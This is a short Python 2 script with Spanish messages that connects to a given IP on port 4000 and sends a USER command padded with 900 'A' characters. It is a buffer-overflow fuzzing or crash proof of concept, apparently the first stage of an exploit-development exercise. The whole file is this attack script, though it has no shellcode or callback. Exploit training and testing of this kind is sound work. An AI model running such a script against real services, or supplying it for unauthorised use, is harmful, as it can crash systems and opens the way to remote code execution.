#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
  sys.exit(0)

buffer = "A"*900
ipAddress = sys.argv[1]

port = 4000

try:
  print "Enviando búffer..."
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send("USER " + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print "\nError de conexión...\n"
  sys.exit(0)

